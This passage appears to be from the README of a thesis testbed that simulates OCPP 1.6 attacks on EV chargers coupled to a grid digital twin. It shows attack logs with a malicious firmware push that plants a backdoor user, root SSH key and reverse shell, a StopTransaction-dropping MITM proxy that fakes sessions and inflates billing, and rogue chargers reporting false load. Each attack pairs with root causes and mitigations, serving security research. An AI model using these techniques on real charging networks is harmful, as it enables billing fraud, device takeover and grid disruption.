[14:20:15] [ROGUE-CSMS]   location     : http://127.0.0.1:8080/firmware.sh
[14:20:15] [ROGUE-CSMS]   retrieve_date: 2024-06-19T14:20:16+00:00
[14:20:15] [ROGUE-CSMS] OCPP 1.6 carries no firmware signature

[14:20:16] [HTTP-PAYLOAD] Malicious firmware delivered to 127.0.0.1

[14:20:16] [ROGUE-CSMS] FirmwareStatusNotification: downloading
[14:20:17] [ROGUE-CSMS] FirmwareStatusNotification: downloaded
[14:20:17] [ROGUE-CSMS] EVSE downloaded payload — zero integrity checks performed
[14:20:18] [ROGUE-CSMS] FirmwareStatusNotification: installing
[14:20:18] [ROGUE-CSMS] EVSE is executing payload — backdoor being installed
[14:20:19] [ROGUE-CSMS] FirmwareStatusNotification: installed

[14:20:19] !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
[14:20:19]   PAYLOAD INSTALLED — EVSE FULLY COMPROMISED
[14:20:19]   Backdoor user 'backdoor' created (sudo)
[14:20:19]   SSH key implanted in /root/.ssh/authorized_keys
[14:20:19]   Reverse shell: 172.19.0.30:4444
[14:20:19] !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
```

**Root cause:** `UpdateFirmware` in OCPP 1.6 has no signature field; EVSE has no way to verify CSMS identity (no mutual TLS).  
**Mitigation:** OCPP 2.0.1 `SignedUpdateFirmware` with X.509 certificate chain; mutual TLS on CSMS WebSocket; EVSE-side firmware hash and signature verification before installation.

---

### Attack 6 — Duration Spoofing (StopTransaction Suppression)

**Script:** `attacks/attack_duration_spoof.py`  
**Profile:** `duration-spoof`  
**Network:** operator-net (172.19.0.41)  
**Initial access:** ARP poisoning / rogue switch on charging site LAN

OCPP 1.6 gives the CSMS no independent mechanism to detect when an EV physically disconnects — it relies entirely on the EVSE sending `StopTransaction`. A MITM proxy can intercept and suppress this message, sustaining a phantom charging session on the CSMS after the real EV has left.

This is the **opposite** of premature session termination (Attack 3a). Rather than forging an early stop, it prevents the legitimate stop from being acknowledged by the real CSMS, keeping the session open indefinitely.

| Phase | Duration | Action |
|-------|----------|--------|
| 1 — Transparent relay | 0 s → real disconnect | `BootNotification`, `StartTransaction`, and `MeterValues` forwarded normally. Proxy captures `transactionId` from the `StartTransaction` ACK. |
| 2 — StopTransaction DROP | At real disconnect | EVSE sends `StopTransaction`. Proxy intercepts it, sends a **forged ACK** back to the EVSE so it disconnects cleanly. The message is **not forwarded** to the CSMS — the CSMS never learns the session ended. |
| 3 — Ghost session | 50 s (configurable) | Proxy injects synthetic `MeterValues` at 60 kW every 10 s, sustaining the phantom session. After the ghost window, a final `StopTransaction` is sent to clean up CSMS state. |

**PGTwin impact:** The CSMS reports an active 60 kW load on a physically idle charger. If the CSMS feeds load data to the PGTwin grid twin at each `MeterValues` interval, the simulation accumulates non-existent grid demand. With the default 50 s ghost window, **0.83 kWh of phantom energy** is injected per spoofed session. The error grows linearly with ghost duration and number of targeted chargers.

**Evidence in the pcap (capture container: `atk-duration-spoof`, filter: `port 9003 or port 9000`):**
- `StopTransaction` appears on port 9003 (EVSE→proxy) — **absent on port 9000** (proxy→CSMS)
- Forged ACK appears on port 9003 (proxy→EVSE) at the same instant
- Phantom `MeterValues` appear on port 9000 only, after port 9003 goes silent

```bash
# Run the proxy (Terminal 1 after starting CSMS)
python attacks/attack_duration_spoof.py --csms-url ws://127.0.0.1:9000

# Run EVSE with a timed session so it sends StopTransaction (Terminal 2)
python core/evse_client4_fixed.py --url ws://127.0.0.1:9003 --session-duration 20

# Longer ghost phase for PGTwin integration demo
python attacks/attack_duration_spoof.py --ghost-duration 120 --meter-interval 5
```

**Expected output — proxy terminal:**
```
  Proxy listening on : ws://0.0.0.0:9003
  Forwarding to CSMS : ws://127.0.0.1:9000
  Ghost duration     : 60s after real disconnect
  Meter interval     : 10s (synthetic MeterValues)

[PRX 14:25:01.100] EVSE connected — opening upstream CSMS connection
[PRX 14:25:01.117] CP identity: 'CP_1' → relaying to CSMS
[ATK 14:25:01.118] DURATION SPOOF PROXY ACTIVE — CP: 'CP_1'
[ATK 14:25:01.118] Waiting for StopTransaction to intercept...

[E→C 14:25:01.122] [BootNotification] uid=a1b2c3d4 → forwarding
[C→E 14:25:01.137] [StartTransaction ACK] transactionId=1 captured
[E→C 14:25:03.210] [MeterValues] uid=b3c4d5e6 → forwarding       ← Phase 1: transparent

[ATK 14:25:21.500] PHASE 2 — StopTransaction INTERCEPTED AND DROPPED
[ATK 14:25:21.500]   EVSE 'CP_1' → NOT forwarded to CSMS
[ATK 14:25:21.500]   transactionId : 1
[ATK 14:25:21.500]   meterStop     : 180000 Wh  (real final reading)
[ATK 14:25:21.500]   Forging ACK → EVSE disconnects cleanly, CSMS never learns
[ATK 14:25:21.512] Forged StopTransaction ACK sent to EVSE

[GHO 14:25:21.515] PHASE 3 — GHOST SESSION ACTIVE
[GHO 14:25:21.515]   EVSE 'CP_1' physically gone — CSMS sees active session
[GHO 14:25:21.515]   Ghost duration : 60s  (MeterValues every 10s)
[GHO 14:25:21.515]   Phantom power  : 60.0 kW = 0.1667 kWh/interval
[GHO 14:25:31.516] Phantom MeterValues #1: 180167 Wh  (+167 Wh phantom energy)
[GHO 14:25:41.517] Phantom MeterValues #2: 180334 Wh  (+167 Wh phantom energy)
[GHO 14:26:21.521] Phantom MeterValues #6: 181002 Wh  (+167 Wh phantom energy)

[GHO 14:26:21.522] Ghost ended — 0.1002 kWh phantom energy injected
[GHO 14:26:21.535] Final StopTransaction: meterStop=181002 Wh (includes phantom energy)
```

**Expected output — CSMS terminal (key evidence: 60 kW load persists after EVSE is gone):**
```
[CSMS] Connected: CP_1
[CSMS] CP_1 | StartTransaction: connectorId=1 idTag=EV001 meterStart=0 Wh → txId=1
[CSMS] CP_1 | Power = 34.52 kW    ← real EVSE charging
[CSMS] CP_1 | Power = 41.18 kW
[CSMS] CP_1 | Power = 60.0 kW     ← ghost session begins here (EVSE already disconnected)
[CSMS] CP_1 | Power = 60.0 kW
[CSMS] CP_1 | Power = 60.0 kW     ← phantom load reported for 60s after physical disconnect

[CSMS] !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
[CSMS]  STOPTRANSACTION received from : CP_1
[CSMS]  transaction_id : 1
[CSMS]  meter_stop     : 181002 Wh     ← inflated by ghost energy
[CSMS]  --> SESSION TERMINATED — billing closed at 181002 Wh
[CSMS] !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
```

**Root cause:** `StopTransaction` is unsigned and unverified; CSMS has no independent disconnect detection; OCPP 1.6 has no session-liveness timeout tied to physical charger state.  
**Mitigation:** WSS + mutual TLS (prevents MITM interposition); CSMS Heartbeat inactivity timeout (Heartbeat stops when EVSE disconnects, eventually triggering a timeout); OCPP 2.0.1 signed `StopTransaction`; physical pilot-signal monitoring (CSMS cross-checks CP state against EVSE presence signal).

---

### Attack 7 — Single EVSE Grid Overload + PGTwin Introduction

**Script:** `attacks/attack_overload_grid.py`  
**Profile:** `overload-grid`  
**Network:** public-net (single rogue EVSE)  
**Grid:** Dr. Biswas's 7-substation Singapore distribution network (`grid/ZSGplussync_docker.py`)

The simplest possible PGTwin integration: a **single** rogue EVSE connects to the CSMS and sends MeterValues with progressively inflated power readings. OCPP 1.6 has no mechanism for the CSMS to verify reported kW against a charger's physical rating — any value is accepted unconditionally. Each load step is held long enough for the PGTwin power-flow results to stabilise, producing a clear, monotonic voltage sag at Bus 44 (Load4, DS4, 0.4 kV).

This attack is intentionally simpler than the botnet attacks that follow. Its role is pedagogical: prove the OCPP→grid coupling, establish the baseline vm_pu reference, and show that one rogue unit is sufficient to measurably stress a feeder.

**Coupling mechanism:**
```
[atk-overload-grid] ──writes──► /shared/ev_load_kw.txt ◄──reads── [pgtwin]
  (single EVSE, inflated kW)        (Docker volume)             (pandapower runpp)
```

| Step | Reported load | Bus 44 vm_pu | Total load |
|------|--------------|-------------|------------|
| 0 — Baseline | 0 kW | **0.9689** | 1290 kW |
| 1 — Nominal | 11 kW | **0.9662** | 1301 kW |
| 2 — 2× over-report | 22 kW | **0.9633** | 1312 kW |
| 3 — 4× over-report | 44 kW | **0.9575** | 1334 kW |
| 4 — 6× over-report | 66 kW | **0.9515** | 1356 kW |
| 5 — Cleanup | 0 kW | **0.9689** | 1290 kW |

```bash
docker compose --profile overload-grid up --build --force-recreate
```

**Expected output — pgtwin container (key evidence: monotonic vm_pu sag per step):**
```
[PGTwin] 7-substation grid simulator running. EV load injected at Load4 (Bus 44).
[PGTwin] iter=   1 | EV=    0.0 kW | Load4(Bus44) vm_pu=0.9689 | total_load=1290 kW  ← baseline
...
[PGTwin] iter=  51 | EV=   11.0 kW | Load4(Bus44) vm_pu=0.9662 | total_load=1301 kW  ← step 1
...
[PGTwin] iter= 101 | EV=   22.0 kW | Load4(Bus44) vm_pu=0.9632 | total_load=1312 kW  ← step 2
...
[PGTwin] iter= 201 | EV=   44.0 kW | Load4(Bus44) vm_pu=0.9575 | total_load=1334 kW  ← step 3
...
[PGTwin] iter= 301 | EV=   66.0 kW | Load4(Bus44) vm_pu=0.9517 | total_load=1356 kW  ← step 4
...
[PGTwin] iter= 401 | EV=    0.0 kW | Load4(Bus44) vm_pu=0.9689 | total_load=1290 kW  ← recovery
```

**Expected output — atk-overload-grid container:**
```
  CSMS           : ws://csms:9000
  Load steps     : [0.0, 11.0, 22.0, 44.0, 66.0, 0.0] kW
  Step duration  : 20s  |  MV interval: 2s
  Grid target    : Load4 Bus 44 (DS4, 0.4 kV, small industry)

[OK  09:10:03] Registered with CSMS — no CP authentication required

  BASELINE — no EV load
[GRD 09:10:03] Step 0 |   0.0 kW → ev_load_kw.txt | tick  1

  OVERLOAD STEP 1 — 11 kW reported
[GRD 09:10:23] Step 1 |  11.0 kW → ev_load_kw.txt | tick  1

  OVERLOAD STEP 2 — 22 kW reported
[GRD 09:10:43] Step 2 |  22.0 kW → ev_load_kw.txt | tick  1

  OVERLOAD STEP 3 — 44 kW reported
[GRD 09:11:03] Step 3 |  44.0 kW → ev_load_kw.txt | tick  1

  OVERLOAD STEP 4 — 66 kW reported
[GRD 09:11:23] Step 4 |  66.0 kW → ev_load_kw.txt | tick  1

  CLEANUP — load cleared, bus recovers
[GRD 09:11:43] Step 5 |   0.0 kW → ev_load_kw.txt | tick  1

  ATTACK 7 COMPLETE

  Grid evidence (read SimOutputBus.csv from shared volume):
  - Column vm_pu45: Bus 44 voltage — decreases with each step
  - Expected:  0 kW → 0.9689 pu
               11 kW → 0.9662 pu
               22 kW → 0.9633 pu
               44 kW → 0.9575 pu
               66 kW → 0.9515 pu
                0 kW → 0.9689 pu  (recovery)

  Thesis evidence checklist:
  [x] Single rogue EVSE: no authentication, any ID accepted
  [x] Inflated MeterValues accepted by CSMS without verification
  [x] Each load step produces measurable Bus 44 voltage sag
  [x] Grid impact monotonically proportional to reported kW
  [x] Full recovery after load cleared (confirms coupling)
```

**Root cause:** No CP authentication; MeterValues are unsigned and unverified in OCPP 1.6; CSMS has no cross-check against physical metering data.  
**Mitigation:** OCPP 2.0.1 operator-signed `SetChargingProfile` per CP; CSMS plausibility check against rated connector capacity; smart meter cross-check.

---

### Attack 8 — Coordinated Load Altering + PGTwin Grid

**Script:** `attacks/attack_load_grid.py`  
**Profile:** `load-grid`  
**Network:** public-net (external botnet → CSMS) + shared Docker volume (OCPP→grid coupling)  
**Grid:** Dr. Biswas's 7-substation Singapore distribution network (`grid/ZSGplussync_docker.py`)

Attack #4 re-run against the real PGTwin instead of the toy grid twin. Five unauthenticated bot chargers connect to the CSMS over OCPP 1.6, execute coordinated load commands, and write the aggregated EV kW to a Docker shared volume file (`/shared/ev_load_kw.txt`). The PGTwin container reads this file before every `runpp()` call and injects the load at **Bus 44** (Load4, DS4, 0.4 kV, small industry feeder, baseline 100 kW).

**Coupling mechanism:**
```
[atk-load-grid] ──writes──► /shared/ev_load_kw.txt ◄──reads── [pgtwin]
   (OCPP MeterValues)           (Docker volume)              (pandapower runpp)
```

| Phase | Action | Bus 44 vm_pu | Total load |
|-------|--------|-------------|------------|
| Baseline | 5 bots × 11 kW = 55 kW reported | **0.9546** | 1345 kW |
| Surge | Same fleet, coordinated max | **0.9546** | 1345 kW |
| Drop | All bots → 0 kW | **0.9689** | 1290 kW |
| Oscillate | Toggle 0 ↔ 55 kW every 5 s | alternates | alternates |

```bash
docker compose --profile load-grid up --build --force-recreate
```

**Expected output — pgtwin container (key evidence: vm_pu sag on bot connect, recovery on drop):**
```
[PGTwin] 7-substation grid simulator running. EV load injected at Load4 (Bus 44).
[PGTwin] iter=   1 | EV=   55.0 kW | Load4(Bus44) vm_pu=0.9546 | total_load=1345 kW
[PGTwin] iter=   2 | EV=   55.0 kW | Load4(Bus44) vm_pu=0.9546 | total_load=1345 kW
...
[PGTwin] iter=1323 | EV=    0.0 kW | Load4(Bus44) vm_pu=0.9689 | total_load=1290 kW   ← DROP phase
...
[PGTwin] iter=2109 | EV=   55.0 kW | Load4(Bus44) vm_pu=0.9546 | total_load=1345 kW   ← OSCILLATE MAX
[PGTwin] iter=2110 | EV=   55.0 kW | Load4(Bus44) vm_pu=0.9546 | total_load=1345 kW
[PGTwin] iter=2111 | EV=   11.0 kW | Load4(Bus44) vm_pu=0.9662 | total_load=1301 kW   ← mid-transition
[PGTwin] iter=2112 | EV=    0.0 kW | Load4(Bus44) vm_pu=0.9689 | total_load=1290 kW   ← OSCILLATE ZERO
```

**Expected output — atk-load-grid container:**
```
  CSMS           : ws://csms:9000
  Bot fleet      : 5 chargers × 11 kW
  EV load file   : /shared/ev_load_kw.txt
  Phase duration : 30s each
  Grid target    : Load4 Bus 44 (DS4, 0.4 kV, small industry)

[OK  13:35:17] 5 bots registered with CSMS

  BASELINE — normal operation
[GRD 13:35:17] Tick  1 | all bots → 11 kW | total=55 kW → PGTwin

  ATTACK — COORDINATED DEMAND SURGE
[ATK 13:35:47] Tick  1 | SURGE all 5 bots → 11 kW | total=55 kW → PGTwin ⚡

  ATTACK — COORDINATED DEMAND DROP
[ATK 13:36:17] Tick  1 | DROP  all 5 bots → 0 kW | total=0 kW → PGTwin

  ATTACK — OSCILLATING LOAD
[ATK 13:36:47] Tick  1 | ▲ MAX  all bots → 11 kW | total=55 kW → PGTwin
[ATK 13:36:52] Tick  2 | ▼ ZERO all bots →  0 kW | total= 0 kW → PGTwin

  Fleet size   : 5 bots × 11 kW
  Peak load    : 55 kW injected at Bus 44 (Load4)

  Grid evidence (read from shared volume):
  - SimOutputBus.csv  → column vm_pu45 (Bus 44 voltage)
  - SimOutputLine.csv → column loading_percent40 (feeder to Load4)

  Thesis evidence checklist:
  [x] OCPP 1.6: no CP authentication — any ID accepted by CSMS
  [x] Surge phase: Load4 Bus 44 voltage sags in PGTwin CSV
  [x] Drop phase:  voltage rises, feeder loading drops
  [x] Oscillate:   repeated grid swings — relay wear risk
  [x] Grid impact visible in Dr. Biswas's ZSGplussync topology
```

**Root cause:** No CP authentication; no operator-signed charging profiles; OCPP 1.6 MeterValues are the sole load signal to the grid model.  
**Mitigation:** OCPP 2.0.1 `SetChargingProfile` with signed profiles; CSMS concurrent connection rate limiting; grid-side ROCOL (rate-of-change-of-load) protection relays.

---

### Attack 9 — Duration Spoofing + PGTwin Grid

**Script:** `attacks/attack_spoof_grid.py`  
**Profile:** `spoof-grid`  
**Network:** operator-net (172.19.0.42) + shared Docker volume  
**Initial access:** ARP poisoning / rogue switch on charging site LAN

Attack #6 re-run against the real PGTwin. A MITM proxy on port 9004 intercepts the EVSE's `StopTransaction`, sends a forged ACK so the EVSE disconnects cleanly, then holds `/shared/ev_load_kw.txt` at the phantom load value for 60 seconds. During this window the EVSE is physically gone, but Bus 44 in the grid model remains depressed — an anomaly that cannot be detected from OCPP 1.6 alone.

| Phase | What happens | Bus 44 vm_pu |
|-------|-------------|-------------|
| 1 — Transparent relay | Real MeterValues forwarded; grid file updated with live kW | 0.9662 (11 kW) → 0.9532 (60 kW) |
| 2 — StopTransaction DROP | Intercepted; forged ACK sent; EVSE exits code 0 | held at phantom kW |
| 3 — Ghost session (60 s) | Synthetic MeterValues every 10 s; file held at 11 kW | **0.9662** — bus stressed, EVSE gone |
| 4 — Cleanup | `ev_load_kw.txt` cleared; final StopTransaction sent to CSMS | recovers to **0.9689** |

```bash
docker compose --profile spoof-grid up --build --force-recreate
```

**Expected output — atk-spoof-grid container:**
```
  Proxy listening  : ws://0.0.0.0:9004
  Forwarding to    : ws://csms:9000
  Ghost duration   : 60s
  Phantom load     : 11 kW
  Grid target      : Bus 44 (Load4, DS4, 0.4 kV)

[PRX 13:43:39] EVSE connected — opening upstream CSMS connection
[E→C 13:43:39] [BootNotification] → forwarding
[E→C 13:43:39] [StartTransaction] connectorId=1 → forwarding
[GRD 13:43:39] ev_load_kw.txt ← 11.0 kW  (PHANTOM — EVSE gone)
[E→C 13:43:49] [MeterValues] → forwarding + grid updated
[GRD 13:43:49] ev_load_kw.txt ← 60.0 kW  (PHANTOM — EVSE gone)

[ATK 13:43:59] ==============================================================
[ATK 13:43:59] PHASE 2 — StopTransaction INTERCEPTED AND DROPPED
[ATK 13:43:59]   EVSE 'CP_1' → NOT forwarded to CSMS
[ATK 13:43:59]   transactionId : 1
[ATK 13:43:59]   meterStop     : 332 Wh (real final reading)
[ATK 13:43:59]   EV load file  : HELD at 11 kW (phantom begins)
[ATK 13:43:59] Forged StopTransaction ACK sent to EVSE → EVSE disconnects cleanly

[GHO 13:43:59] PHASE 3 — GHOST SESSION ACTIVE
[GHO 13:43:59]   EVSE 'CP_1' physically gone
[GHO 13:43:59]   CSMS still sees active session (transactionId=1)
[GHO 13:43:59]   PGTwin still sees 11 kW at Bus 44 (ev_load_kw.txt held)
[GHO 13:43:59]   Ghost duration : 60s  (MeterValues every 10s)

[GRD 13:44:09] ev_load_kw.txt ← 11.0 kW  (PHANTOM — EVSE gone)
[GHO 13:44:09] Ghost MV #1 | t+10s | 362 Wh (+30 Wh) | Bus44 still loaded at 11 kW
[GRD 13:44:19] ev_load_kw.txt ← 11.0 kW  (PHANTOM — EVSE gone)
[GHO 13:44:19] Ghost MV #2 | t+20s | 392 Wh (+30 Wh) | Bus44 still loaded at 11 kW
...
[GHO 13:44:59] Ghost MV #6 | t+60s | 512 Wh (+30 Wh) | Bus44 still loaded at 11 kW
[GHO 13:44:59] Ghost ended — 0.1800 kWh phantom energy injected to CSMS
[GHO 13:44:59] PHASE 4 — clearing grid load and sending final StopTransaction
[GRD 13:44:59] ev_load_kw.txt ← 0.0 kW  (cleared)
[GHO 13:44:59] Final StopTransaction sent to CSMS: meterStop=512 Wh

  Proxy duration             : 80.1s
  Real charge energy         : 0.3320 kWh
  Phantom energy (CSMS)      : 0.1800 kWh
  Ghost MeterValues sent     : 6
  StopTransaction dropped    : YES

  PGTwin grid impact:
  - Bus 44 (Load4) vm_pu depressed for 60s after real disconnect
  - ev_load_kw.txt held at 11 kW during ghost phase
  - Visible in SimOutputBus.csv column vm_pu45
  - Operator sees: CSMS active session = 0.1800 kWh phantom load
  - Reality: EVSE physically idle, bus still stressed in grid model
```

**Expected output — pgtwin container (key evidence: vm_pu held at 0.9662 after EVSE gone):**
```
[PGTwin] iter=  46 | EV=   60.0 kW | Load4(Bus44) vm_pu=0.9532 | total_load=1350 kW
[PGTwin] iter=  47 | EV=   11.0 kW | Load4(Bus44) vm_pu=0.9662 | total_load=1301 kW
                                                          ↑ EVSE disconnects here (Phase 2)
[PGTwin] iter=  48 | EV=   11.0 kW | Load4(Bus44) vm_pu=0.9662 | total_load=1301 kW
...  (60 seconds of ghost phase — hundreds of iterations at 0.9662) ...
[PGTwin] iter= 750 | EV=    0.0 kW | Load4(Bus44) vm_pu=0.9689 | total_load=1290 kW
                                                          ↑ Phase 4 cleanup — bus recovers
```

**Root cause:** `StopTransaction` is unsigned; CSMS has no independent disconnect detection; OCPP 1.6 has no session-liveness timeout tied to physical charger state.  
**Mitigation:** WSS + mutual TLS (prevents MITM interposition); CSMS Heartbeat inactivity timeout; OCPP 2.0.1 signed `StopTransaction`; physical pilot-signal monitoring cross-checked against OCPP session state.

---

### Grid Topology Visualiser

**Script:** `attacks/a6breakers.py`

Builds the full grid twin (220 kV → 66 kV → 22 kV, 7 town loads × 200 MW, 500 EV chargers × 220 kW) and exports an interactive Plotly diagram to `grid_visualization.html`. Run locally — not included in Docker profiles.

```bash
python attacks/a6breakers.py
```

---

## References

- Saposnik, L.R. & Porat, D. (2023). *Hijacking EV charge points to cause DoS.* SaiFlow Security Advisory.
- Johnson et al. (2023). *Disrupting EV Charging Sessions.* Idaho National Laboratory, INL/CON-23-72329.
- Open Charge Alliance. *OCPP 1.6 Specification.*
- Open Charge Alliance. *OCPP 2.0.1 Security Whitepaper.*
